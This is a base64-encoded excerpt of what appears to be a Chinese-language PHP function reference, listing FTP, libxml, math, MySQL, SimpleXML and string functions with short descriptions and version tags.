jKCnU2iBGVFAgyc/WtNDQ0ru49rPM0PIvw/zB7qGjcGhwNHxmdHBfZmdldCgptNMgRlRQILf+zvHG98nPz8LU2NK7uPbOxLz+sqKxo7Tmtb2xvrXY0ru49tLRvq208r+qtcTOxLz+1tCho3BocDN8ZnRwX2ZwdXQoKcnPtKvSu7j20tG08r+qtcTOxLz+o6yyotTaIEZUUCC3/s7xxvfJz7DRy/yxo7TmzqrSu7j2zsS8/qGjcGhwM3xmdHBfZ2V0X29wdGlvbigpt7W72LWxx7AgRlRQIMGsvdO1xLj31tayu82stcTRoc/uyejWw6GjcGhwNHxmdHBfZ2V0KCm00yBGVFAgt/7O8cb3z8LU2M7EvP6ho3BocDN8ZnRwX2xvZ2luKCm1x8K8IEZUUCC3/s7xxveho3BocDN8ZnRwX21kdG0oKbe1u9jWuLaozsS8/rXE1+6689DeuMTKsbzkoaNwaHAzfGZ0cF9ta2Rpcigp1NogRlRQILf+zvHG97S0vajSu7j20MLEv8K8oaNwaHAzfGZ0cF9uYl9jb250aW51ZSgpwazQ+LvxyKGjr7eiy83OxLz+IChub24tYmxvY2tpbmcpoaNwaHA0fGZ0cF9uYl9mZ2V0KCm000ZUULf+zvHG98nPz8LU2M7EvP6yorGjtOa1vbG+tdjS0b6ttPK/qrXEzsS8/tbQKG5vbi1ibG9ja2luZylwaHA0fGZ0cF9uYl9mcHV0KCnJz7Sr0tG08r+qtcTOxLz+o6yyotTaRlRQt/7O8cb3yc+w0cv8saO05s6qzsS8/ihub24tYmxvY2tpbmcpoaNwaHA0fGZ0cF9uYl9nZXQoKbTTIEZUUCC3/s7xxvfPwtTYzsS8/iAobm9uLWJsb2NraW5nKaGjcGhwNHxmdHBfbmJfcHV0KCmw0c7EvP7Jz7Srtb23/s7xxvcgKG5vbi1ibG9ja2luZymho3BocDR8ZnRwX25saXN0KCm3tbvY1ri2qMS/wry1xM7EvP7B0LHtoaNwaHAzfGZ0cF9wYXN2KCm3tbvYtbHHsCBGVFAgsbu2r8Sjyr3Kx7fxtPK/qqGjcGhwM3xmdHBfcHV0KCmw0c7EvP7Jz7Srtb23/s7xxveho3BocDN8ZnRwX3B3ZCgpt7W72LWxx7DEv8K8w/uzxqGjcGhwM3xmdHBfcXVpdCgpZnRwX2Nsb3NlKCkgtcSx8MP7oaNwaHAzfGZ0cF9yYXcoKc/yIEZUUCC3/s7xxve3osvN0ru49iByYXcgw/zB7qGjcGhwNXxmdHBfcmF3bGlzdCgpt7W72Na4tqjEv8K81tDOxLz+tcTP6s+4wdCx7aGjcGhwM3xmdHBfcmVuYW1lKCnW2MP8w/sgRlRQILf+zvHG98nPtcTOxLz+u/LEv8K8oaNwaHAzfGZ0cF9ybWRpcigpyb6z/SBGVFAgt/7O8cb3yc+1xMS/wryho3BocDN8ZnRwX3NldF9vcHRpb24oKcno1sO499bWIEZUUCDUy9DQyrHRoc/uoaNwaHA0fGZ0cF9zaXRlKCnP8rf+zvHG97eiy80gU0lURSDD/MHuoaNwaHAzfGZ0cF9zaXplKCm3tbvY1ri2qM7EvP61xLTz0KGho3BocDN8ZnRwX3NzbF9jb25uZWN0KCm08r+q0ru49rCyyKu1xCBTU0wtRlRQIMGsvdOho3BocDR8ZnRwX3N5c3R5cGUoKbe1u9jUtrPMIEZUUCC3/s7xxve1xM+1zbPA4NDNserKtrf7oaNwaHAzfGhlYWRlcigpz/K/zbuntsu3osvN1K3KvLXEIEhUVFAgsajNt6GjcGhwM3xoZWFkZXJzX2xpc3QoKbe1u9jS0beiy821xKOou/K0/beiy821xKOpz+zTps23sr+1xNK7uPbB0LHtoaNwaHA1fGhlYWRlcnNfc2VudCgpvOyy6SBIVFRQILGozbfKx7fxt6LLzS/S0beiy821vbrOtKaho3BocDN8c2V0Y29va2llKCnP8r/Nu6e2y7eiy83Su7j2IEhUVFAgY29va2lloaNwaHAzfHNldHJhd2Nvb2tpZSgpsru21CBjb29raWUg1rW9+NDQIFVSTCCx4MLro6y3osvN0ru49iBIVFRQIGNvb2tpZaGjcGhwNXxsaWJ4bWxfY2xlYXJfZXJyb3JzKCnH5b/VIGxpYnhtbCC07c7zu7qz5aGjcGhwNXxsaWJ4bWxfZ2V0X2Vycm9ycygpvOzL97TtzvPK/dfpoaNwaHA1fGxpYnhtbF9nZXRfbGFzdF9lcnJvcigptNMgbGlieG1sILzsy/fX7rrztcS07c7zoaNwaHA1fGxpYnhtbF9zZXRfc3RyZWFtc19jb250ZXh0KCnOqs/C0ru0ziBsaWJ4bWwgzsS1tbzT1Ni78tC0yOvJ6NbDwfe7t76zoaNwaHA1fGxpYnhtbF91c2VfaW50ZXJuYWxfZXJyb3JzKCm9+9PDIGxpYnhtbCC07c7zo6zUytDt08O7p7C00Oi2wcihtO3O89DFz6Kho3BocDV8YWJzKCm++LbU1rWho3BocDN8YWNvcygpt7TT4M/SoaNwaHAzfGFjb3NoKCm3tMurx/rT4M/SoaNwaHA0fGFzaW4oKbe01f3P0qGjcGhwM3xhc2luaCgpt7TLq8f61f3P0qGjcGhwNHxhdGFuKCm3tNX9x9Cho3BocDN8YXRhbjIoKcG9uPayzsr9tcS3tNX9x9Cho3BocDN8YXRhbmgoKbe0y6vH+tX9x9Cho3BocDR8YmFzZV9jb252ZXJ0KCnU2sjO0uK9+NbG1q685Nequ7vK/dfWoaNwaHAzfGJpbmRlYygpsNG2/r341sbXqru7zqrKrr341saho3BocDN8Y2VpbCgpz/LJz8nhyOvOqtfuvdO9/LXE1fvK/aGjcGhwM3xjb3MoKdPgz9Kho3BocDN8Y29zaCgpy6vH+tPgz9Kho3BocDR8ZGVjYmluKCmw0cquvfjWxtequ7vOqrb+vfjWxqGjcGhwM3xkZWNoZXgoKbDRyq69+NbG16q7u86qyq7B+b341saho3BocDN8ZGVjb2N0KCmw0cquvfjWxtequ7vOqrDLvfjWxqGjcGhwM3xkZWcycmFkKCm9q73HtsjXqru7zqq7obbIoaNwaHAzfGV4cCgpt7W72CBFeCC1xNa1oaNwaHAzfGV4cG0xKCm3tbvYIEV4IC0gMSC1xNa1oaNwaHA0fGZsb29yKCnP8s/CyeHI686q1+690738tcTV+8r9oaNwaHAzfGZtb2QoKbe1u9iz/beotcS4obXjyv3T4Mr9oaNwaHA0fGdldHJhbmRtYXgoKc/Uyr7L5rv6yv3X7rTztcS/ycTc1rWho3BocDN8aGV4ZGVjKCmw0cquwfm9+NbG16q7u86qyq69+NbGoaNwaHAzfGh5cG90KCm8xsvj1rG9x8j9vcfQzrXE0LGx37Oktsiho3BocDR8aXNfZmluaXRlKCnF0LbPyse38c6q09DP3ta1oaNwaHA0fGlzX2luZmluaXRlKCnF0LbPyse38c6qzt7P3ta1oaNwaHA0fGlzX25hbigpxdC2z8rHt/HOqrrPt6jK/da1oaNwaHA0fGxjZ192YWx1ZSgpt7W72Le2zqfOqiAoMCwgMSkgtcTSu7j2zrHL5rv6yv2ho3BocDR8bG9nKCnX1Mi7ttTK/aGjcGhwM3xsb2cxMCgp0tQgMTAgzqq117XEttTK/aGjcGhwM3xsb2cxcCgpt7W72CBsb2coMSArIG51bWJlcimho3BocDR8bWF4KCm3tbvY1+6089a1oaNwaHAzfG1pbigpt7W72Nfu0KHWtaGjcGhwM3xtdF9nZXRyYW5kbWF4KCnP1Mq+y+a7+sr9tcTX7rTzv8nE3Na1oaNwaHAzfG10X3JhbmQoKcq508MgTWVyc2VubmUgVHdpc3RlciDL47eot7W72Mvmu/rV+8r9oaNwaHAzfG10X3NyYW5kKCmypdbWIE1lcnNlbm5lIFR3aXN0ZXIgy+a7+sr9yfqzycb3oaNwaHAzfG9jdGRlYygpsNGwy7341sbXqru7zqrKrr341saho3BocDN8cGkoKbe1u9jUstbcwsq1xNa1oaNwaHAzfHBvdygpt7W72CB4ILXEIHkgtM63vaGjcGhwM3xyYWQyZGVnKCmw0buhtsjK/dequ7vOqr3HtsjK/aGjcGhwM3xyYW5kKCm3tbvYy+a7+tX7yv2ho3BocDN8cm91bmQoKbbUuKG148r9vfjQ0MvEyeHO5cjroaNwaHAzfHNpbigp1f3P0qGjcGhwM3xzaW5oKCnLq8f61f3P0qGjcGhwNHxzcXJ0KCnGvbe9uPmho3BocDN8c3JhbmQoKbKlz8LL5rv6yv23osn6xvfW1tfToaNwaHAzfHRhbigp1f3H0KGjcGhwM3x0YW5oKCnLq8f61f3H0KGjcGhwNHxlem1sbV9oYXNoKCm8xsvjIEVaTUxNINPKvP7B0LHtz7XNs8v50Oi1xMmiwdDWtaGjcGhwM3xtYWlsKCnUytDtxPq0073Fsb7W0NaxvdO3osvNtefX09PKvP6ho3BocDN8bXlzcWxfYWZmZWN0ZWRfcm93cygpyKG1w8ew0ru0ziBNeVNRTCCy2df3y/nTsM/stcS8x8K80NDK/aGjcGhwM3xteXNxbF9jaGFuZ2VfdXNlcigpsrvU3rPJoaO4xLHku+62r8GsvdPW0LXHwry1xNPDu6dwaHAzfG15c3FsX2NsaWVudF9lbmNvZGluZygpt7W72LWxx7DBrL3TtcTX1rf7vK+1xMP7s8ZwaHA0fG15c3FsX2Nsb3NlKCm52LHVt8ez1r7DtcQgTXlTUUwgway906GjcGhwM3xteXNxbF9jb25uZWN0KCm08r+qt8ez1r7DtcQgTXlTUUwgway906GjcGhwM3xteXNxbF9jcmVhdGVfZGIoKbK71N6zyaGj0MK9qCBNeVNRTCDK/b7dv+Kho8q508MgbXlzcWxfcXVlcnkoKSC0+szmoaNwaHAzfG15c3FsX2RhdGFfc2Vlaygp0sa2r7zHwrzWuNXroaNwaHAzfG15c3FsX2RiX25hbWUoKbTTttQgbXlzcWxfbGlzdF9kYnMoKSC1xLX308O3tbvYyv2+3b/iw/uzxqGjcGhwM3xteXNxbF9kYl9xdWVyeSgpsrvU3rPJoaO3osvN0rvM9SBNeVNRTCCy6dGvoaPKudPDIG15c3FsX3NlbGVjdF9kYigpILrNIG15c3FsX3F1ZXJ5KCkgtPrM5qGjM3xteXNxbF9kcm9wX2RiKCmyu9Tes8mho7aqxvqjqMm+s/2jqdK7uPYgTXlTUUwgyv2+3b/ioaPKudPDIG15c3FsX3F1ZXJ5KCkgtPrM5qGjM3xteXNxbF9lcnJubygpt7W72MnP0ru49iBNeVNRTCCy2df31tC1xLTtzvPQxc+itcTK/dfWseDC66GjcGhwM3xteXNxbF9lcnJvcigpt7W72MnP0ru49iBNeVNRTCCy2df3svrJ+rXEzsSxvrTtzvPQxc+ioaNwaHAzfG15c3FsX2VzY2FwZV9zdHJpbmcoKbK71N6zyaGj16rS5dK7uPbX1rf7tK7Tw9PaIG15c3FsX3F1ZXJ5oaPKudPDIG15c3FsX3JlYWxfZXNjYXBlX3N0cmluZygpILT6zOahozR8bXlzcWxfZmV0Y2hfYXJyYXkoKbTTveG5+7yv1tDIobXD0rvQ0Nf3zqq52MGqyv3X6aOsu/LK/dfWyv3X6aOsu/K2/tXfvObT0KGjcGhwM3xteXNxbF9mZXRjaF9hc3NvYygptNO94bn7vK/W0MihtcPSu9DQ1/fOqrnYwarK/dfpoaNwaHA0fG15c3FsX2ZldGNoX2ZpZWxkKCm0073hufu8r9bQyKG1w8HQ0MXPorKi1/fOqrbUz/O3tbvYoaNwaHAzfG15c3FsX2ZldGNoX2xlbmd0aHMoKcihtcO94bn7vK/W0MO/uPbX1rbOtcTE2sjdtcSzpLbIoaNwaHAzfG15c3FsX2ZldGNoX29iamVjdCgptNO94bn7vK/W0MihtcPSu9DQ1/fOqrbUz/Oho3BocDN8bXlzcWxfZmV0Y2hfcm93KCm0073hufu8r9bQyKG1w9K70NDX986qyv3X1sr91+mho3BocDN8bXlzcWxfZmllbGRfZmxhZ3MoKbTTveG5+9bQyKG1w7rN1ri2qNfWts652MGqtcSx6ta+oaNwaHAzfG15c3FsX2ZpZWxkX2xlbigpt7W72Na4tqjX1rbOtcSzpLbIoaNwaHAzfG15c3FsX2ZpZWxkX25hbWUoKcihtcO94bn71tDWuLao19a2zrXE19a2zsP7oaNwaHAzfG15c3FsX2ZpZWxkX3NlZWsoKb2rveG5+7yv1tC1xNa41evJ6LaozqrWuLaotcTX1rbOxqvSxsG/oaNwaHAzfG15c3FsX2ZpZWxkX3RhYmxlKCnIobXD1ri2qNfWts7L+dTatcSx7cP7oaNwaHAzfG15c3FsX2ZpZWxkX3R5cGUoKcihtcO94bn7vK/W0Na4tqjX1rbOtcTA4NDNoaNwaHAzfG15c3FsX2ZyZWVfcmVzdWx0KCnKzbfFveG5+8TatOaho3BocDN8bXlzcWxfZ2V0X2NsaWVudF9pbmZvKCnIobXDIE15U1FMIL/Nu6e2y9DFz6Kho3BocDR8bXlzcWxfZ2V0X2hvc3RfaW5mbygpyKG1wyBNeVNRTCDW97v60MXPoqGjcGhwNHxteXNxbF9nZXRfcHJvdG9faW5mbygpyKG1wyBNeVNRTCDQrdLp0MXPoqGjcGhwNHxteXNxbF9nZXRfc2VydmVyX2luZm8oKcihtcMgTXlTUUwgt/7O8cb30MXPoqGjcGhwNHxteXNxbF9pbmZvKCnIobXD1+69/NK7zPWy6dGvtcTQxc+ioaNwaHA0fG15c3FsX2luc2VydF9pZCgpyKG1w8nP0ruyvSBJTlNFUlQgstnX97L6yfq1xCBJRKGjcGhwM3xteXNxbF9saXN0X2RicygpwdCz9iBNeVNRTCC3/s7xxvfW0Mv509C1xMr9vt2/4qGjcGhwM3xteXNxbF9saXN0X2ZpZWxkcygpsrvU3rPJoaPB0LP2IE15U1FMIL3hufvW0LXE19a2zqGjyrnTwyBteXNxbF9xdWVyeSgpILT6zOahozN8bXlzcWxfbGlzdF9wcm9jZXNzZXMoKcHQs/YgTXlTUUwgvfizzKGjcGhwNHxteXNxbF9saXN0X3RhYmxlcygpsrvU3rPJoaPB0LP2IE15U1FMIMr9vt2/4tbQtcSx7aGjyrnTw1VzZSBteXNxbF9xdWVyeSgpILT6zOahozN8bXlzcWxfbnVtX2ZpZWxkcygpyKG1w73hufu8r9bQ19a2zrXEyv3Ev6GjcGhwM3xteXNxbF9udW1fcm93cygpyKG1w73hufu8r9bQ0NC1xMr9xL+ho3BocDN8bXlzcWxfcGNvbm5lY3QoKbTyv6rSu7j2tb0gTXlTUUwgt/7O8cb3tcSz1r7Dway906GjcGhwM3xteXNxbF9waW5nKClQaW5nINK7uPa3/s7xxvfBrL3To6zI57n7w7vT0MGsvdPU8tbY0MLBrL3ToaNwaHA0fG15c3FsX3F1ZXJ5KCm3osvN0rvM9SBNeVNRTCCy6dGvoaNwaHAzfG15c3FsX3JlYWxfZXNjYXBlX3N0cmluZygp16rS5SBTUUwg0+++5NbQyrnTw7XE19a3+7Su1tC1xMzYyuLX1rf7oaNwaHA0fG15c3FsX3Jlc3VsdCgpyKG1w73hufvK/b7doaNwaHAzfG15c3FsX3NlbGVjdF9kYigp0aHU8SBNeVNRTCDK/b7dv+Kho3BocDN8bXlzcWxfc3RhdCgpyKG1w7Wxx7DPtc2z17TMrKGjcGhwNHxteXNxbF90YWJsZW5hbWUoKbK71N6zyaGjyKG1w7Htw/uho8q508MgbXlzcWxfcXVlcnkoKSC0+szmoaNwaHAzfG15c3FsX3RocmVhZF9pZCgpt7W72LWxx7DP37PMtcQgSUSho3BocDR8bXlzcWxfdW5idWZmZXJlZF9xdWVyeSgpz/IgTXlTUUwgt6LLzdK7zPUgU1FMILLp0a+jqLK7u/HIoSAvILu6tOa94bn7o6mho3BocDR8X19jb25zdHJ1Y3QoKbS0vajSu7j20MK1xCBTaW1wbGVYTUxFbGVtZW50ILbUz/Oho3BocDV8YWRkQXR0cmlidXRlKCm4+CBTaW1wbGVYTUwg1KrL2MztvNPSu7j2yvTQ1KGjcGhwNXxhZGRDaGlsZCgpuPggU2ltcGxlWE1MINSqy9jM7bzT0ru49tfT1KrL2KGjcGhwNXxhc1hNTCgptNMgU2ltcGxlWE1MINSqy9i78cihIFhNTCDX1rf7tK6ho3BocDV8YXR0cmlidXRlcygpu/HIoSBTaW1wbGVYTUwg1KrL2LXEyvTQ1KGjcGhwNXxjaGlsZHJlbigpu/HIoda4tqi92rXjtcTX06GjcGhwNXxnZXREb2NOYW1lc3BhY2VzKCm78cihIFhNTCDOxLW1tcTD/MP7v9W85KGjcGhwNXxnZXROYW1lKCm78cihIFNpbXBsZVhNTCDUqsvYtcTD+7PGoaNwaHA1fGdldE5hbWVzcGFjZXMoKbTTIFhNTCDK/b7du/HIocP8w/u/1bzkoaNwaHA1fHJlZ2lzdGVyWFBhdGhOYW1lc3BhY2UoKc6qz8LSu7TOIFhQYXRoILLp0a+0tL2ow/zD+7/VvOTT776zoaNwaHA1fHNpbXBsZXhtbF9pbXBvcnRfZG9tKCm00yBET00gvdq147vxyKEgU2ltcGxlWE1MRWxlbWVudCC21M/zoaNwaHA1fHNpbXBsZXhtbF9sb2FkX2ZpbGUoKbTTIFhNTCDOxLW1u/HIoSBTaW1wbGVYTUxFbGVtZW50ILbUz/Oho3BocDV8c2ltcGxleG1sX2xvYWRfc3RyaW5nKCm00yBYTUwg19a3+7Suu/HIoSBTaW1wbGVYTUxFbGVtZW50ILbUz/Oho3BocDV8eHBhdGgoKbbUIFhNTCDK/b7d1MvQ0CBYUGF0aCCy6dGvoaNwaHA1fGFkZGNzbGFzaGVzKCnU2ta4tqi1xNfWt/vHsMztvNO3tNCxuNyho3BocDR8YWRkc2xhc2hlcygp1NrWuLaotcTUpLao0uXX1rf7x7DM7bzTt7TQsbjcoaNwaHAzfGJpbjJoZXgoKbDRIEFTQ0lJINfWt/u1xNfWt/u0rtequ7vOqsquwfm9+NbG1rWho3BocDN8Y2hvcCgpcnRyaW0oKSC1xLHww/uho3BocDN8Y2hyKCm009a4tqi1xCBBU0NJSSDWtbe1u9jX1rf7oaNwaHAzfGNodW5rX3NwbGl0KCmw0dfWt/u0rrfWuO7OqtK7way0rrj80KG1xLK/t9aho3BocDN8Y29udmVydF9jeXJfc3RyaW5nKCmw0dfWt/vTydK71tYgQ3lyaWxsaWMg19a3+9equ7uzycHt0rvW1qGjcGhwM3xjb252ZXJ0X3V1ZGVjb2RlKCm21CB1dWVuY29kZSCx4MLrtcTX1rf7tK69+NDQveLC66GjcGhwNXxjb252ZXJ0X3V1ZW5jb2RlKCnKudPDIHV1ZW5jb2RlIMvjt6i21NfWt/u0rr340NCx4MLroaNwaHA1fGNvdW50X2NoYXJzKCm3tbvY19a3+7Suy/nTw9fWt/u1xNDFz6Kho3BocDR8Y3JjMzIoKbzGy+PSu7j219a3+7SutcRwaHAzMi1iaXQgQ1JDoaNwaHA0fGNyeXB0KCm1pc/ytcTX1rf7tK6808Pct6ggKGhhc2hpbmcpoaNwaHAzfGVjaG8oKcrks/bX1rf7tK6ho3BocDN8ZXhwbG9kZSgpsNHX1rf7tK608smizqrK/dfpoaNwaHAzfGZwcmludGYoKbDRuPHKvbuvtcTX1rf7tK7QtLW91ri2qLXEyuSz9sH3oaNwaHA1fGdldF9odG1sX3RyYW5zbGF0aW9uX3RhYmxlKCm3tbvYt63S67HtoaNwaHA0fGhlYnJldigpsNHPo7KuwLTOxLG+tNPT0tbB1/O1xMH316q7u86q1/PWwdPStcTB96GjcGhwM3xoZWJyZXZjKCnNrMnPo6zNrMqxsNEoKSDXqs6qPGJyIC8+oaNwaHAzfGh0bWxfZW50aXR5X2RlY29kZSgpsNEgSFRNTCDKtczl16q7u86q19a3+6GjcGhwNHxodG1sZW50aXRpZXMoKbDR19a3+9equ7vOqiBIVE1MIMq1zOWho3BocDN8aHRtbHNwZWNpYWxjaGFyc19kZWNvZGUoKbDR0rvQqdSktqjS5bXEIEhUTUwgyrXM5dequ7vOqtfWt/uho3BocDV8aHRtbHNwZWNpYWxjaGFycygpsNHSu9Cp1KS2qNLltcTX1rf716q7u86qIEhUTUwgyrXM5aGjcGhwM3xpbXBsb2RlKCmw0cr91+nUqsvY1+m6z86q0ru49tfWt/u0rqGjcGhwM3xqb2luKClpbXBsb2RlKCkgtcSx8MP7oaNwaHAzfGxldmVuc2h0ZWluKCm3tbvYwb249tfWt/u0rtauvOS1xCBMZXZlbnNodGVpbiC+4MDroaNwaHAzfGxvY2FsZWNvbnYoKbe1u9iw/Lqssb612Mr919a8sLv1sdLQxc+iuPHKvbXEyv3X6aGjcGhwNHxsdHJpbSgptNPX1rf7tK7X87Lgyb6z/b/VuPG78sbky/vUpLao0uXX1rf7oaNwaHAzfG1kNSgpvMbL49fWt/u0rrXEIE1ENSDJosHQoaNwaHAzfG1kNV9maWxlKCm8xsvjzsS8/rXEIE1ENSDJosHQoaNwaHA0fG1ldGFwaG9uZSgpvMbL49fWt/u0rrXEIG1ldGFwaG9uZSC8/KGjcGhwNHxtb25leV9mb3JtYXQoKbDR19a3+7SuuPHKvbuvzqq79bHS19a3+7SuoaNwaHA0fG5sX2xhbmdpbmZvKCm3tbvY1ri2qLXEsb612NDFz6Kho3BocDR8bmwyYnIoKdTa19a3+7Su1tC1xMO/uPbQwtDQ1q7HsLLlyOsgSFRNTCC7u9DQt/uho3BocDN8bnVtYmVyX2Zvcm1hdCgpzai5/cenzru31tfpwLS48cq9u6/K/dfWoaNwaHAzfG9yZCgpt7W72NfWt/u0rrXa0ru49tfWt/u1xCBBU0NJSSDWtaGjcGhwM3xwYXJzZV9zdHIoKbDRsunRr9fWt/u0rr3izva1vbHkwb/W0KGjcGhwM3xwcmludCgpyuSz9tK7uPa78rbguPbX1rf7tK6ho3BocDN8cHJpbnRmKCnK5LP2uPHKvbuvtcTX1rf7tK6ho3BocDN8cXVvdGVkX3ByaW50YWJsZV9kZWNvZGUoKb3iwusgcXVvdGVkLXByaW50YWJsZSDX1rf7tK6ho3BocDN8cXVvdGVtZXRhKCnU2tfWt/u0rtbQxLPQqdSktqjS5bXE19a3+8ewzO2807e00LG43KGjcGhwM3xydHJpbSgptNPX1rf7tK61xMSptsu/qsq8yb6z/b/VsNfX1rf7u/LG5Mv71KS2qNLl19a3+6GjcGhwM3xzZXRsb2NhbGUoKcno1sO12Mf40MXPoqOotdjT8tDFz6KjqaGjcGhwM3xzaGExKCm8xsvj19a3+7SutcQgU0hBLTEgyaLB0KGjcGhwNHxzaGExX2ZpbGUoKbzGy+POxLz+tcQgU0hBLTEgyaLB0KGjcGhwNHxzaW1pbGFyX3RleHQoKbzGy+PBvbj219a3+7SutcTGpcXk19a3+7XEyv3Ev6GjcGhwM3xzb3VuZGV4KCm8xsvj19a3+7SutcQgc291bmRleCC8/KGjcGhwM3xzcHJpbnRmKCmw0bjxyr27r7XE19a3+7Su0LTQtMjr0ru49rHkwb/W0KGjcGhwM3xzc2NhbmYoKbj5vt3WuLaotcS48cq9veLO9sC019TSu7j219a3+7SutcTK5MjroaNwaHA0fHN0cl9pcmVwbGFjZSgpzOa7u9fWt/u0rtbQtcTSu9Cp19a3+6Gjo6i21LTz0KHQtLK7w/S40KOpcGhwNXxzdHJfcGFkKCmw0dfWt/u0rszus+TOqtDCtcSzpLbIoaNwaHA0fHN0cl9yZXBlYXQoKbDR19a3+7Su1ti4tNa4tqi1xLTOyv2ho3BocDR8c3RyX3JlcGxhY2UoKczmu7vX1rf7tK7W0LXE0rvQqdfWt/uho6OottS089Ch0LTD9LjQo6lwaHAzfHN0cl9yb3QxMygpttTX1rf7tK7WtNDQIFJPVDEzILHgwuuho3BocDR8c3RyX3NodWZmbGUoKcvmu/q12LTywtLX1rf7tK7W0LXEy/nT0NfWt/uho3BocDR8c3RyX3NwbGl0KCmw0dfWt/u0rrfWuO61vcr91+nW0KGjcGhwNXxzdHJfd29yZF9jb3VudCgpvMbL49fWt/u0rtbQtcS1pbTKyv2ho3BocDR8c3RyY2FzZWNtcCgpsci9z8G9uPbX1rf7tK6ho6OottS089Ch0LSyu8P0uNCjqXBocDN8c3RyY2hyKCnL0cv319a3+7Su1NrB7dK719a3+7Su1tC1xLXa0ru0zrP2z9aho3N0cnN0cigpILXEsfDD+3BocDN8c3RyY21wKCmxyL3Pwb249tfWt/u0rqGjo6i21LTz0KHQtMP0uNCjqXBocDN8c3RyY29sbCgpsci9z8G9uPbX1rf7tK6jqLj5vt2xvrXYyejWw6OpoaNwaHA0fHN0cmNzcG4oKbe1u9jU2tXStb3IzrrO1ri2qLXE19a3+9aux7CjrNTa19a3+7SusunV0rXE19a3+8r9oaNwaHAzfHN0cmlwX3RhZ3MoKbD+yKUgSFRNTKGiWE1MINLUvLAgUEhQILXEserHqaGjcGhwM3xzdHJpcGNzbGFzaGVzKCnJvrP908kgYWRkY3NsYXNoZXMoKSC6r8r9zO2807XEt7TQsbjcoaNwaHA0fHN0cmlwc2xhc2hlcygpyb6z/dPJIGFkZHNsYXNoZXMoKSC6r8r9zO2807XEt7TQsbjcoaNwaHAzfHN0cmlwb3MoKbe1u9jX1rf7tK7U2sHt0rvX1rf7tK7W0LXa0ru0zrP2z9a1xM671sMotPPQodC0srvD9LjQKXBocDV8c3RyaXN0cigpsunV0tfWt/u0rtTawe3Su9fWt/u0rtbQtdrSu7TOs/bP1rXEzrvWwyi089Ch0LSyu8P0uNApcGhwM3xzdHJsZW4oKbe1u9jX1rf7tK61xLOktsiho3BocDN8c3RybmF0Y2FzZWNtcCgpyrnTw9K71tahsNfUyLuhscvjt6jAtLHIvc/Bvbj219a3+7Suo6i21LTz0KHQtLK7w/S40KOpcGhwNHxzdHJuYXRjbXAoKcq508PSu9bWobDX1Mi7obHL47eowLSxyL3Pwb249tfWt/u0rqOottS089Ch0LTD9LjQo6lwaHA0fHN0cm5jYXNlY21wKCnHsCBuILj219a3+7XE19a3+7Susci9z6OottS089Ch0LSyu8P0uNCjqaGjcGhwNHxzdHJuY21wKCnHsCBuILj219a3+7XE19a3+7Susci9z6OottS089Ch0LTD9LjQo6mho3BocDR8c3RycGJyaygp1NrX1rf7tK7W0MvRy/fWuLao19a3+9bQtcTIztLi0ru49qGjcGhwNXxzdHJwb3MoKbe1u9jX1rf7tK7U2sHt0rvX1rf7tK7W0MrXtM6z9s/WtcTOu9bDo6i21LTz0KHQtMP0uNCjqXBocDN8c3RycmNocigpsunV0tfWt/u0rtTawe3Su7j219a3+7Su1tDX7rrz0ru0zrP2z9a1xM671sOho3BocDN8c3RycmV2KCm3tNeq19a3+7SuoaNwaHAzfHN0cnJpcG9zKCmy6dXS19a3+7Su1NrB7dK719a3+7Su1tDX7rrzs/bP1rXEzrvWwyi21LTz0KHQtLK7w/S40ClwaHA1fHN0cnJwb3MoKbLp1dLX1rf7tK7U2sHt0rvX1rf7tK7W0NfuuvOz9s/WtcTOu9bDKLbUtPPQodC0w/S40ClwaHAzfHN0cnNwbigpt7W72NTa19a3+7Su1tCw/LqstcTM2Lao19a3+7XEyv3Ev6GjcGhwM3xzdHJzdHIoKcvRy/fX1rf7tK7U2sHt0rvX1rf7tK7W0LXEyte0zrP2z9ajqLbUtPPQodC0w/S40KOpcGhwM3xzdHJ0b2soKbDR19a3+7Sut9a47s6quPzQobXE19a3+7SuoaNwaHAzfHN0cnRvbG93ZXIoKbDR19a3+7Su16q7u86q0KHQtKGjcGhwM3xzdHJ0b3VwcGVyKCmw0dfWt/u0rtequ7vOqrTz0LSho3BocDN8c3RydHIoKdequ7vX1rf7tK7W0MzYtqi1xNfWt/uho3BocDN8c3Vic3RyKCm3tbvY19a3+7SutcTSu7K/t9aho3BocDN8c3Vic3RyX2NvbXBhcmUoKbTT1ri2qLXEv6rKvLOktsixyL3Pwb249tfWt/u0rqGjcGhwNXxzdWJzdHJfY291bnQoKbzGy+PX07Su1NrX1rf7tK7W0LP2z9a1xLTOyv2ho3BocDR8c3Vic3RyX3JlcGxhY2UoKbDR19a3+7SutcTSu7K/t9bM5ru7zqrB7dK7uPbX1rf7tK6ho3BocDR8dHJpbSgptNPX1rf7tK61xMG9tsvJvrP9v9Ww19fWt/u6zcbky/vUpLao0uXX1rf7oaNwaHAzfHVjZmlyc3QoKbDR19a3+7Su1tC1xMrX19a3+9equ7vOqrTz0LSho3BocDN8dWN3b3JkcygpsNHX1rf7tK7W0MO/uPa1pbTKtcTK19fWt/vXqru7zqq089C0oaNwaHAzfHZmcHJpbnRmKCmw0bjxyr27r7XE19a3+7Su0LS1vda4tqi1xMrks/bB96GjcGhwNXx2cHJpbnRmKCnK5LP2uPHKvbuvtcTX1rf7tK6ho3BocDR8dnNwcmludGYoKbDRuPHKvbuv19a3+7Su0LTI67Hkwb/W0KGjcGhwNHx3b3Jkd3JhcCgpsLTV1da4tqizpLbIttTX1rf7tK69+NDQ1dvQ0LSmwO2ho3BocDR8dXRmOF9kZWNvZGUoKbDRIFVURi04INfWt/u0rr3iwuvOqiBJU08tODg1OS0xoaNwaHAzfHV0ZjhfZW5jb2RlKCmw0SBJU08tODg1OS0xINfWt/u0rrHgwuvOqiBVVEYtOKGjcGhwM3x4bWxfZXJyb3Jfc3RyaW5nKCm78cihIFhNTCC94s72xve1xLTtzvPD6Mr2oaNwaHAzfHhtbF9nZXRfY3VycmVudF9ieXRlX2luZGV4KCm78cihIFhNTCC94s72xve1xLWxx7DX1r3ay/fS/aGjcGhwM3x4bWxfZ2V0X2N1cnJlbnRfY29sdW1uX251bWJlcigpu/HIoSBYTUwgveLO9sb3tcS1scewwdC6xaGjcGhwM3x4bWxfZ2V0X2N1cnJlbnRfbGluZV9udW1iZXIoKbvxyKEgWE1MIL3izvbG97XEtbHHsNDQusWho3BocDN8eG1sX2dldF9lcnJvcl9jb2RlKCm78cihIFhNTCC94s72xve07c7ztPrC66GjcGhwM3x4bWxfcGFyc2UoKb3izvYgWE1MIM7EtbWho3BocDN8eG1sX3BhcnNlX2ludG9fc3RydWN0KCmw0SBYTUwgyv2+3b3izva1vcr91+nW0KGjcGhwM3x4bWxfcGFyc2VyX2NyZWF0ZV9ucygptLS9qLT409DD/MP7v9W85Nans9a1xCBYTU